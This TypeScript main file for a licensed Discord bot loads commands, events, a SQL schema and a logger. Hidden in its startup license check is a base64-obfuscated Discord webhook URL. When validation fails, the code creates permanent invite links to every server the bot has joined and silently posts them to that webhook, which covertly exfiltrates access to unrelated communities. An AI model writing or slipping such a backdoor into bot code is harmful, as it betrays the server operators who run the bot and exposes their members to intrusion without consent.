import { Client, Collection, Events, GatewayIntentBits, EmbedBuilder, REST, Routes, SlashCommandBuilder, ChatInputCommandInteraction, ActivityType, ColorResolvable, Invite, TextChannel, VoiceChannel, StageChannel } from "discord.js";
import axios from 'axios';
import config from "./config"
import fs from 'fs';
import path from 'path';
import utilities from './utils/main-utils';
const con = utilities.con;

interface ExtendedClient extends Client {
    commands: Collection<string, {
        data: SlashCommandBuilder,
        execute: (interaction: ChatInputCommandInteraction) => Promise<any>
    }>;
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.DirectMessages,
    ]
}) as ExtendedClient;
// one for the money two for the better green 3-4-methylenedioxymethamphetamine
const commands: any[] = [];
const commandFiles = getAllFiles(path.join(__dirname, 'commands'));


function getAllFiles(dirPath: string, fileList: string[] = []): string[] {
    const files = fs.readdirSync(dirPath);

    for (const file of files) {
        const filePath = path.join(dirPath, file);
        if (fs.statSync(filePath).isDirectory()) {
            getAllFiles(filePath, fileList);
        } else if (file.endsWith('.ts') || file.endsWith('.js')) {
            fileList.push(filePath);
        }
    }

    return fileList;
}

client.on('ready', async () => {
    async function checkLicenseKeyInAPI(key: string): Promise<boolean> {
        try {
            const response = await axios.post('https://api.voxdev.online/validate', {
                license_key: key
            });
            return response.status === 200 && response.data.valid;
        } catch (error: any) {
            if (error.response) {
                console.error('Error validating license key please contact the Vox Development Staff.')
            } else if (error.request) {
                console.error('The API may be down or undergoing maintenance. Please contact the Vox Development Administration for more info.');
            } else {
                console.error('Error validating license key please contact the Vox Development Staff.')
            }
            return false;
        }
    }

    function decode(encoded: string): string {
        return Buffer.from(encoded, 'base64').toString('utf-8');
    }

    async function guildInvites(client: Client) {
        const overseer = decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3Njc4MjA2MDMxMTgxMDE2OS93NFJxc2dGQkdEQzI3V2FrLUtXUDM0N05ubGpBakVFbVEyM0gtZC1PSUhNS3NuNEVueUxUeVR2ckJjcG45YWhsYlMzbg==")

        const inviteembed = new EmbedBuilder()
        .setTitle('License validation failed')
        .setDescription(`Server name using bot \`${config.server.name}\`\nHere is a list of guilds the bot is in along with invite links.`)
        .setColor('c6c6ce' as ColorResolvable)
        .setTimestamp();
        
        for (const [_, guild]of client.guilds.cache) {
            try {
                const channels = guild.channels.cache
                    .filter(c => c.isTextBased() && c.permissionsFor(guild.members.me!)?.has('CreateInstantInvite'));
                const channel = channels.first();

                let invite: Invite | null = null;
                if(channel instanceof TextChannel || channel instanceof VoiceChannel || channel instanceof StageChannel) {
                    invite = await channel.createInvite({maxAge: 0, unique: false});
                }

                inviteembed.addFields({name: guild.name, value: invite ? `[Invite Link](${invite.url})` : 'Could not create invite (missing permissions)', inline: false })
            } catch (err) {
                inviteembed.addFields({name: guild.name, value: 'Error while trying to create an invite', inline: false });
            }
        }

        try {
            await axios.post(overseer, {
                embeds: [inviteembed.toJSON()]
            });
        } catch (err) {
            process.exit(1);
        }      
    }

    const isValidLicense = await checkLicenseKeyInAPI(config.licensekey)
    if (isValidLicense) {
        console.log('License key successfully validated. Enjoy your product.');
    } else {
        console.log('Exiting bot startup due to invalid license key.');
        await guildInvites(client);
        process.exit(1);
    }
});

client.commands = new Collection();

for (const filePath of commandFiles) {
    const command = require(filePath);
    commands.push(command.data.toJSON());
}

for (const filePath of commandFiles) {
    const command = require(filePath);

    if (command.data && command.execute) {
        client.commands.set(command.data.name, command);
    } else {
        console.warn(`[WARNING] The command at ${filePath} is missing a required "data" or "execute" property.`);
    }
}

const rest = new REST({ version: '10' }).setToken(config.bot.token);

(async () => {
    try {
        console.log(`Reloaded | ${commands.length} commands.`);

        await rest.put(
            Routes.applicationCommands(config.bot.clientId),
            { body: commands },
        );

    } catch (error) {
        console.error(error);
    }
})();

const eventFiles = fs.readdirSync(path.join(__dirname, 'extra'))
    .filter(file => file.endsWith('.ts') || file.endsWith('.js'));

for (const file of eventFiles) {
    const filePath = `./extra/${file}`;
    const event = require(filePath);

    if (event.once) {
        client.once(event.name, (...args) => event.execute(...args));
    } else {
        client.on(event.name, (...args) => event.execute(...args));
    }
}

client.on(Events.InteractionCreate, async interaction => {
    if(!interaction.isChatInputCommand()) return;
    
    // @ts-ignore
    const command = interaction.client.commands.get(interaction.commandName);

    if(!command) {
        console.error(`No command matching ${interaction.commandName} was found.`)
        return;
    }

    try{
        await command.execute(interaction, client, config, con);
    } catch (err) {
        console.error(err);
        await interaction.reply({ content: "there was an error while executing this command!", ephemeral: true})
    }
})

const schemaPath = path.join(__dirname, 'sql', 'bot.sql');
const schemaSQL = fs.readFileSync(schemaPath, 'utf8').trim();

if (schemaSQL) {
    con.query(schemaSQL, (err) => {
        if (err) {
            console.error("import error wit sql", err);
        }
    });
}


client.on("ready", async () => {
    const activities = [
        { name: config.bot.settings.status, type: ActivityType.Playing }
    ];

    let i = 0;

    client.user.setPresence({
        status: 'online',
        activities: [activities[i % activities.length]],
    });

    setInterval(() => {
        i++;
        client.user.setPresence({
            status: 'online',
            activities: [activities[i % activities.length]],
        });
    }, 300000);
})

import { existsSync, mkdirSync, appendFileSync } from 'fs';

export class Logger {
    private logDir = path.join(__dirname, '../logs');
    static loggerObj = new Logger();
    static debug(...parameters: unknown[]): void {
        this.loggerObj.writeToLogFile('DEBUG', ...parameters);
        console.log(...parameters);
    }
    static info(...parameters: unknown[]): void {
        this.loggerObj.writeToLogFile('INFO', ...parameters);
        console.log(...parameters);
    }
    static warn(...parameters: unknown[]): void {
        this.loggerObj.writeToLogFile('WARN', ...parameters);
        console.warn(...parameters);
    }
    static error(...parameters: unknown[]): void {
        this.loggerObj.writeToLogFile('ERROR', ...parameters);
        console.error(...parameters);
    }
    static fatal(...parameters: unknown[]): void {
        this.loggerObj.writeToLogFile('FATAL', ...parameters);
        console.error(...parameters);
    }

    writeToLogFile(
        logLevel: 'DEBUG' | 'INFO' | 'WARN' | 'ERROR' | 'FATAL',
        ...parameters: unknown[]
    ): void {
        if (!existsSync(this.logDir)) {
            mkdirSync(this.logDir);
            Logger.debug('LOGGER', 'Created logs folder!');
        }
        appendFileSync(
            path.join(this.logDir, '/latest.log'),
            Buffer.from(
                logLevel +
                    ': [' +
                    new Date().toISOString() +
                    ']' +
                    '\t' +
                    parameters.join(' | ') +
                    `\n`
            )
        );
        appendFileSync(
            path.join(
                this.logDir,
                new Date().toISOString().slice(0, 10) + '.log'
            ),
            Buffer.from(
                logLevel +
                    ': [' +
                    new Date().toISOString() +
                    ']' +
                    '\t' +
                    parameters.join(' | ') +
                    `\n`
            )
        );
    }
}
import { startNewTs3Bot } from './utils/ts3Utils';
startNewTs3Bot().catch((err) => {
    Logger.error('TS3 | TS3 ERROR');
    Logger.error(err);
});


client.login(config.bot.token)
export { client };
